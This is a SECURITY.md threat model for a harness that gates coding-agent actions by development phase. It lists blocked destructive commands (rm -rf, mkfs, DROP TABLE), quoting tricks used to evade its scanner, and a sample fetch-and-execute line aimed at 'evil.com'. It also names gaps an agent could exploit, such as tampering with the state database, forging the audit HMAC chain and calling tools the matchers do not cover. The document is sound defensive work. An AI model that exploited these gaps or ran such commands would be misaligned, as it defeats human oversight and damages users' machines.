# SECURITY.md — SWEBOK v4 Harness

## Scope

This document describes the **threat model** and **security boundary** of the SWEBOK v4 Harness. The harness is a **structural enforcement layer** for SDLC phases inside Claude Code sessions, not a hardened isolation container.

**Honest framing**: this is a developer convenience tool that adds structural friction against accidental phase violations and runs a string-pattern scanner over Bash commands. It is NOT a sandbox, NOT an authentication boundary, NOT a tamper-proof audit system. The threat model below names what is in scope, what is out, and where the gaps are.

## In scope (the harness DOES protect against)

| Threat | Mitigation |
|---|---|
| Accidental write to `src/` in P1-P4 (specification phase) | `phase-guard.sh` blocks Write/Edit; `bash_scanner.py` blocks writes-via-shell |
| Unrecoverable wipe (`rm -rf /`, `mkfs`, `DROP TABLE`) in any phase | `bash_scanner.py` global destructive-command list (covers `rm -rf <abs>`, `rm --`, `find -delete`, `shred`, `mkfs.*`, `dd of=/dev/*`, `DROP TABLE/DATABASE`) |
| Shell-quoting evasions (eval, ANSI-C `$'...'`, `bash -c`, source, BASH_ENV, backticks, `$(...)`) | `decode_shell_quotes()` pre-pass unwraps wrappers and appends decoded content for the main scanner |
| Audit-log silent deletion | 4 audit tables protected by `BEFORE DELETE` triggers; triggers restored on every `_init_db()` call (defense in depth against crash-window between DROP and CREATE in maintenance prune). **BEFORE UPDATE protection is NOT installed** — an attempt to add it in 2026-06-01 caused regression in WAL-mode high-frequency writes; row-content tampering remains an OUT-OF-SCOPE gap until the trigger semantics can be made compatible with the write workload. |
| Concurrent state corruption | SQLite WAL + `BEGIN EXCLUSIVE` + busy_timeout=30s + 10-attempt retry loop in `_xact()`; verified at 1000-way concurrent atomicity (live) |
| State DB schema migration with data loss | Backup-before-migrate via `shutil.copy2`; M16 pre-rebuild snapshot preserves audit history through `rebuild()` |
| Stale lock / corrupted DB | `rebuild()` detects corruption, renames `.db.corrupt.<ts>`, re-inits, copies audit forward |
| Hook crash leaking past phase enforcement | `set -euo pipefail` + `trap exit 1 ERR` in all hook scripts; fail-CLOSED on any internal error |
| 3-strike denial-of-service via override-flag toggling | Circuit breaker now fail-CLOSED: 3 blocks → hard `exit 1` with operator instructions; auto-override removed |

## Out of scope (the harness does NOT protect against)

A user or a sub-agent with full Python and shell access on the same machine can defeat the harness. The harness assumes the model is **cooperative with the SDLC discipline**, not adversarial against the developer's machine. The following are explicitly out of scope:

1. **Direct SQLite tampering**: anyone with write access to `.swebok_state.db` can `INSERT OR REPLACE` arbitrary state. Mitigation: file-system ACL, not the harness. Add an LSM/seccomp sandbox if your threat model includes this. **Mitigation now in place**: per-row HMAC chain (added v3 migration, 2026-06-01) detects post-hoc tampering of audit rows; `verify_audit_chain()` returns the break point.
2. **String-scanner evasion via opaque computation**: a scanner cannot decode arbitrary `python -c "$(curl evil.com)"` or unconstrained shell composition. The scanner extends `decode_shell_quotes()` to constructions we've seen (eval, bash -c, ANSI-C `$'...'`, backticks, `$(...)`, `source/.`, `BASH_ENV`, base64 decode adjacent to the word `base64`); it is not a syntactic parser. Path-based and word-based attacks that survive these decoders remain out of scope.
3. **Out-of-band file writes**: a sub-agent that calls a tool whose matcher is not in `.claude/settings.json` is invisible to the gate. **Mitigation now in place**: matcher catalogue extended to `Write|Edit|MultiEdit|NotebookEdit`, `Bash`, `Skill|Task|Agent|WebFetch|WebSearch`, AND `mcp__.*|Glob|Grep|LS|TodoWrite|NotebookRead|ExitPlanMode`.
4. **Compromised installer**: `install-harness.sh` is unsigned. A user who runs `bash install-harness.sh` from a compromised clone gives the malicious package full FS access as their UID. The installer now MERGES (not overwrites) `~/.claude/settings.json`, prompts for consent, and writes a timestamped backup.
5. **Cryptographic chain-of-custody for audit log**: as of 2026-06-01, each audit row carries a `row_hmac` HMAC-SHA256 over `(prev_hmac, ts, fields)`. The secret lives in `$SWEBOK_AUDIT_KEY` or in `$HARNESS_DIR/.audit_key` (mode 0600). Detection is structural: a deleted row or modified row breaks the chain, and `verify_audit_chain()` returns the break point. **Limitations**: the chain is detection-only, not prevention (no BEFORE UPDATE trigger — see "BEFORE UPDATE NOT installed" above); and the secret on a single-laptop install is as protected as its file ACL — anyone who reads `.audit_key` can forge the chain. For higher assurance, set `$SWEBOK_AUDIT_KEY` from a secrets manager and ship to an off-host sink.
6. **Multi-project state isolation**: as of 2026-06-01, `STATE_DB` resolves in priority `$SWEBOK_STATE_DB` (explicit) > `<git_project_root>/.swebok_state.db` (per-project) > `$HARNESS_DIR/.swebok_state.db` (legacy global). Each project under git gets its own state automatically; the legacy single-global only fires for the harness's own dev tree.
7. **Privilege separation**: all hooks run as the user. There is no setuid, no chroot, no sandbox. A Python `eval` bug in any hook is RCE. This is out of scope for the current threat model.
8. **MCP / Glob / Grep / LS / TodoWrite / NotebookRead / ExitPlanMode tools**: covered by the matcher catalogue added 2026-06-01. The harness gates these on the `phase-guard.sh` path.

## Reporting

Security issues should be reported privately, not in a public issue. Include:
- The bypass payload or attack vector
- The phase the system was in
- The output the harness produced
- Whether the bypass was deterministic

## Last reviewed

2026-06-01 — independent council audit (CISO, QA Lead, Architect, DevOps) + 8-finder adversarial workflow (150 findings, 114 confirmed). Post-fix grade target: S in all 4 dimensions.

## Threat model details

See [docs/v1/THREAT_MODEL.md](docs/v1/THREAT_MODEL.md) for the per-asset attack tree.
